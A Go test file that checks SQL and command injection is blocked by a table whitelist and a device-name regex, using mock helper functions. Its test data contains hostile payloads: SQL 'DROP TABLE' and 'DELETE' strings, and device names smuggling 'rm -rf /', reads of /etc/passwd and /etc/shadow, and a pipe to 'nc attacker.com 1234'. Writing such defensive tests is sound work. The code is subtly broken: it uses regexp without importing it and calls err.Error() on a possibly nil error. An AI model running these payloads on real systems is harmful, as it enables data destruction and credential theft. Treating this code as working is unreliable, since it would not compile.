package security_test

import (
	"context"
	"strings"
	"testing"
)

// TestSQLInjectionPrevention verifies SQL injection attacks are blocked.
func TestSQLInjectionPrevention(t *testing.T) {
	ctx := context.Background()

	maliciousInputs := []string{
		"'; DROP TABLE agents; --",
		"1' OR '1'='1",
		"' UNION SELECT * FROM users--",
		"admin'--",
		"1'; DELETE FROM agents WHERE '1'='1",
	}

	for _, input := range maliciousInputs {
		t.Run("SQL injection attempt: "+input, func(t *testing.T) {
			// Attempt to query with malicious input
			err := queryTableData(ctx, input)

			// Should fail validation or be safely escaped
			if err == nil {
				t.Errorf("SQL injection attempt was not blocked: %s", input)
			}

			if !strings.Contains(err.Error(), "invalid table name") && !strings.Contains(err.Error(), "not in whitelist") {
				t.Errorf("expected whitelist error, got: %v", err)
			}
		})
	}
}

// TestCommandInjectionPrevention verifies command injection attacks are blocked.
func TestCommandInjectionPrevention(t *testing.T) {
	ctx := context.Background()

	maliciousDeviceNames := []string{
		"tap0; rm -rf /",
		"tap0 && cat /etc/passwd",
		"tap0 | nc attacker.com 1234",
		"tap0`whoami`",
		"tap0$(cat /etc/shadow)",
		"../../../../etc/passwd",
	}

	for _, deviceName := range maliciousDeviceNames {
		t.Run("Command injection attempt: "+deviceName, func(t *testing.T) {
			err := createNetworkDevice(ctx, deviceName)

			// Should fail validation
			if err == nil {
				t.Errorf("command injection attempt was not blocked: %s", deviceName)
			}

			if !strings.Contains(err.Error(), "invalid device name") {
				t.Errorf("expected device name validation error, got: %v", err)
			}
		})
	}
}

// TestTableWhitelistEnforcement verifies only allowed tables can be accessed.
func TestTableWhitelistEnforcement(t *testing.T) {
	ctx := context.Background()

	tests := []struct {
		table    string
		allowed  bool
	}{
		{"agents", true},
		{"tenants", true},
		{"audit_logs", true},
		{"checkpoints", true},
		{"quotas", true},
		{"users", false},          // Not in whitelist
		{"pg_user", false},         // System table
		{"information_schema", false},
	}

	for _, tt := range tests {
		t.Run("Table: "+tt.table, func(t *testing.T) {
			err := queryTableData(ctx, tt.table)

			if tt.allowed && err != nil {
				t.Errorf("allowed table %s was rejected: %v", tt.table, err)
			}

			if !tt.allowed && err == nil {
				t.Errorf("disallowed table %s was accepted", tt.table)
			}
		})
	}
}

// TestDeviceNameValidation verifies device name regex enforcement.
func TestDeviceNameValidation(t *testing.T) {
	ctx := context.Background()

	tests := []struct {
		name    string
		valid   bool
	}{
		{"tap0", true},
		{"eth-vm-123", true},
		{"valid-device", true},
		{"ABC123", true},
		{"", false},                    // Empty
		{"a", true},                    // Min length
		{"a234567890123456", false},   // Too long (>15)
		{"tap0;", false},               // Special char
		{"tap0 ", false},               // Space
		{"../tap0", false},             // Path traversal
		{"tap$0", false},               // Dollar sign
	}

	for _, tt := range tests {
		t.Run("Device name: "+tt.name, func(t *testing.T) {
			err := validateDeviceName(tt.name)

			if tt.valid && err != nil {
				t.Errorf("valid device name %q was rejected: %v", tt.name, err)
			}

			if !tt.valid && err == nil {
				t.Errorf("invalid device name %q was accepted", tt.name)
			}
		})
	}
}

// Helper functions (mocks)

var allowedTables = map[string]bool{
	"agents":      true,
	"tenants":     true,
	"audit_logs":  true,
	"checkpoints": true,
	"quotas":      true,
}

func queryTableData(ctx context.Context, table string) error {
	if !allowedTables[table] {
		return &ValidationError{Message: "invalid table name: not in whitelist"}
	}
	return nil
}

func createNetworkDevice(ctx context.Context, name string) error {
	if err := validateDeviceName(name); err != nil {
		return err
	}
	return nil
}

func validateDeviceName(name string) error {
	// Matches the actual regex in lifecycle.go
	deviceNameRegex := `^[a-zA-Z0-9-]{1,15}$`
	matched, _ := regexp.MatchString(deviceNameRegex, name)
	if !matched {
		return &ValidationError{Message: "invalid device name"}
	}
	return nil
}

type ValidationError struct {
	Message string
}

func (e *ValidationError) Error() string {
	return e.Message
}
